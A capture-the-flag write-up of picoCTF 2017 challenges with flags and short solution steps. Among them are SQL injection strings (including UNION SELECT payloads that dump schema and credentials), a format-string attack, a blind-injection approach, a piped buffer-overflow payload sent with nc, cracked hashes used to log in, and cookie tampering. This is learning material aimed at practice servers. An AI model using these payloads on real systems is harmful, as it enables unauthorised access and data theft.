# pico-ctf-2017
Pico CTF 2017 WriteUp

## Level 1

### Forensics

#### Digital Camoflage

Download .pcap: https://webshell2017.picoctf.com/static/946bfc004a92d66c6da9eec9ef840a7f/data.pcap

Open .pcap with wireshark (or other options), and look for HTTP Posts

Find base 64 pass: userid=grassers&pswrd=cHJ2cUJaTnFZdw%3D%3D ('%3D' == '=')

echo "cHJ2cUJaTnFZdw==" | base64 -d

  Flag: prvqBZNqYw
  
#### Special Agent User

.pcap: https://webshell2017.picoctf.com/static/8ba021c5ca6a71891cee3da9081b9042/data.pcap

Filter for HTTP protocol

User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36

Flag: Chrome 35.0.2117

### Crypto

#### Keyz

Find writeup in cryptography/keyz-writeup.txt

#### Substitution

Find writeup in cryptography/substitute-writeup.txt

#### Hash101

Find solution script in ./cryptography/hash101.py

#### computeAES
Chipher info file: https://webshell2017.picoctf.com/static/42aa6b6cb84065358f1e80b6a4a724e0/clue.txt

Chipher text:

echo "V3Vqirostg6qW26sle5mnyrwEYSrteN6oHkilO50e9dFkN+0JhC3yu0LcQNw/hXU" | base64 -d |od -A n -t x1 | tr -d '\n '                                                           
57756a8aba2cb60eaa5b6eac95ee669f2af01184abb5e37aa0792294ee747bd74590dfb42610b7caed0b710370fe15d4

Key: 

echo "r7y1dhmTvjQrcra7A1UQFw==" | base64 -d |od -A n -t x1 | tr -d ' '                                      

afbcb5761993be342b72b6bb03551017

Decode AES (http://aes.online-domain-tools.com/)

  Flag: flag{do_not_let_machines_win_6a68a292}

### Reverse Engineering

#### Hex2Raw
dnne@shell-web:/problems/88518d23aee7ee21e50bdd8414a404c1$ python -c 'print "7ca67167db329a5d1508cc4ad5380678".decode("hex")' | ./hex2raw

#### Raw2Hex
./raw2hex | od -A n -t x1 | tr -d '\n ' | cut -c 24-

(24 = len("The flag is:") * 2)

Obs: can also be done with hexdump and a bit of work

  Flag: a31a330cd93cd9f0efbf144d93036eded

### Web Exploitation

#### What is Web
http://shell2017.picoctf.com:52334/
Inspect Element:
  < !-- The first part of the flag (there are 3 parts) is fab79c49d9e -- >
  
http://shell2017.picoctf.com:52334/hacker.css
  The second part of the flag is 5ba511a0f24
  
http://shell2017.picoctf.com:52334/script.js
  The final part of the flag is 36308e33e85
  
Flag is: fab79c49d9e5ba511a0f2436308e33e85

### Misc

#### Internet Kitties
Just NC and prints flag

#### Piazza
Google Piazza picoCTF, and open first link

Sign up for class using activation code: 31337

Create Account

Enter VERRRRRY UGLY FORUMMMMMMMM!!!!!

Find flag in pinned notes:

  flag{ask_and_hop3fully_we_can_help}
  
  
#### Leaf of the tree
CD to the given folder

Then cd with tab by "trunk" until end of dir tree and cat flag.


#### Leaf of the forest
ls -R > output_file

grep after "flag" ; cat flag with full path


#### World Chat
nc ... > chat_output

wait a bit... flag is printed in parts

there are 8 parts, grep after "this is part"
  

### Master Challenge 1

Javascript conosole, edit the check password function to return true.
flag: client_side_is_the_dark_sidee5dbd5f8c6ae5e282766571e06569d50


## Level 2

### Forensics
cat the image.png and look for strings - see "Your flag is flag_2_meta_4_me_lat_lon_5d71"<br/>
Get lat/long values from image metadata (open image, see details, GPS data)


### Crypto

#### SoRandom

Find solution script in ./cryptography/sorandom.py

#### Leaked Hashes
https://webshell2017.picoctf.com/static/ffebc6eb7f76ccbbbb5ba71dc04ea25a/hashdump.txt <br/>
Go to crackstation (or other) and put some hashes in there: <br/>
Obtain ~= 21 valid hashes <br/>
EX: <br/>
  89689941d40794e311ef8bc7061b9944	md5	7h1ck User: christene <br/>
  8b1660cfc5ce8217cb9188cc6b652e91	md5	p4p3r User: nadia <br/>
<br/>
nc shell2017.picoctf.com 3815 <br/>
User: christene <br/>
Password: 7h1ck <br/>
<br/>
flag is 4f36a002cc953e6567a878758abc8cf9 <br/>

### Reverse

#### A thing called the stack
Facut "de mana"<br/>
Registrii sunt pe 4bytes.
FLAG: esp - ret_addr = 0xB4 + ebx + esi + edi + old_ebp = 0xB4 + 0x10 = 0xC4

#### Programmers Assemble
"Ochiometric": se face un loop care aduna 0x4 in ebx pana ajunge 0x3ca8
Solutia: 3882 iteratii -> 0xf2a


### Web 

#### My first sql
User: ' OR 1=1 --  
Pass: any

#### TW_GR_E1_ART
link = http://shell2017.picoctf.com:16929/

link/package.json

link/server/serv.js

link/server/game.js

ctrl+f: revealFlag

check == 64

get to floor 4

console: for(var i = 0; i < state.items.length; i++) { if(state.items[i].effects[0].check == 64) { console.log(state.items[i]) } }

find location column and row: c:5 r:13 (may vary but didn't happen to me)

your starting poz: c:3 r:1 (this doesn't vary)

  Flag: at_least_the_world_wasnt_destroyed_by_a_meteor_ad4c3d82ea34de855538845381a616cf

#### TW_GR_E2_EoTDS
Used a teleportation hax (with in game item mind you) to get the flag.

Flag: i_dont_want_to_say_goodbye__gets_me_every_time_4ea52e1f6e60b37e759a8134d66bd295

### Binary

#### I've got a secret
Format string attack: %6$x to print the random number in hex


### Misc

#### Mistery Box
Enigma machine

Geheimnis: PXQQ TAMY YDBC WGYE LVN
Umkehrwalze: B
Grundstellung: PPP
Ringstellung: LOG
Steckerbrett: G-L, H-F

http://enigma.louisedade.co.uk/enigma.html

Flag: QUIT EPUZ ZLIN GIND EED

### Master Challenge 2

Corrupted file, replace first 8 bytes with the 8 bytes of a PNG header -> Unzip -> fame and glory


## Level 3

### Forensics

#### Connect the Wigle

Plot points from location using lat and lon

Flag: FLAG{F0UND_M3_20C860C7}

### Reverse Engineering

#### JSut Duck It Up

Get file from: https://webshell2017.picoctf.com/static/28b775ce2c0cefd469d81041920195c3/file

Copy contents of the file and run it in javascript

Result: Alert(aw_yiss_ducking_breadcrumbs_964eae3b);

  Flag: aw_yiss_ducking_breadcrumbs_964eae3b

#### Coffee

Download freeThePickle.class: https://webshell2017.picoctf.com/static/90046e7cd0d4e2f6153ac81b978b66ee/freeThePickles.class

Decompile to .java: http://www.javadecompilers.com/

Modify the java to print get_flag()

  Flag: flag_{pretty_cool_huh}
  
#### Much Ado About Hacking

Find solution script in ./reverse/muchsimplerhacking.py

Related materials: reverse/muchadoabouthacking\*

  Flag: Its@MidSuMm3rNights3xpl0!t

### Web

#### Biscuit

Your friend has a personal website. Fortunately for you, he is a bit of a noob when it comes to hosting a website. Can you find out what he is hiding? Website.

http://shell2017.picoctf.com:6299/

Check source:  
Storing stuff in the same directory as your web server doesn't seem like a good idea  
Thankfully, we use a hidden one that is super PRIVATE, to protect our cookies.sqlite file

http://shell2017.picoctf.com:6299/private/cookies.sqlite

Modify cookie ID=F3MAqpWxIvESiUNLHsflVd

#### A Happy Union
Nice video about Advanced SQL Injection: https://www.youtube.com/watch?v=rdyQoUNeXSg&t=22s

Register user: admin' UNION ALL SELECT name, name, sql FROM sqlite_master --

And login with that user.

The sqlite vulnerability is in the getPost() method.

In this case it will get: the post of admin (stops at ') + UNION of the results of select from table sqlite_master (equivalent of information schema in sql)

Get: CREATE TABLE users(user text, pass text)

Register user: admin' UNION ALL SELECT user, user, pass FROM users --

Flag: flag{union?_why_not_onion_a69464d4869c743e26c08df8686e4003}

### No Eyes
Two different error messages: one if the user does not exist, another if the password is wrong.
Blind injection for password characters using the username field.
Code is in web/no_eyes.py

### Binary Exploitation

#### Guess the number

The binary shifts the given input one byte to the right, then passes it to eax and calls it. 
The binary contains a method which invokes a shell.
I just had to pass a integer which is the address of the aforementioned method.

[flag] f9ff07fd1d4c7226fd23d998ea2b4b00

### Master Level 3
Find solution script at ./master/level3.py

Related files: master/war\*

(Piping the payload doesn't work all the way.
python -c 'print "\x01"\*50+"\n"+"1\n"\*52+"48\n"+"96\n"+"192\n"+"384\n"' | nc shell2017.picoctf.com 4415
Now works in glorious pwntools)

The overflow in the name seems to overwrite the total number of cards in each players deck (probably overwrites a \x00\x00 that is supposed to mark the end of the deck), previous limit was 15.

After turn 52 (when you have 48 coins left), the game will give you cards off the stack, (in this case 1 of suit 1) these being the overflown values from the insert name phase.

(Ex: if you did: 'print "\x01\x0e"\*50...', at round 48 you would get cards 14 of suit 1 and start winning)

Flag: 45912e79bbc247b344f6d0248fa3dc7f

## Level 4

### Crypto

#### SmallSign

Find solution script in ./cryptography/smallsign_cracker.py

### Master Level 4

Find solution script in ./cryptography/master-level-4.py
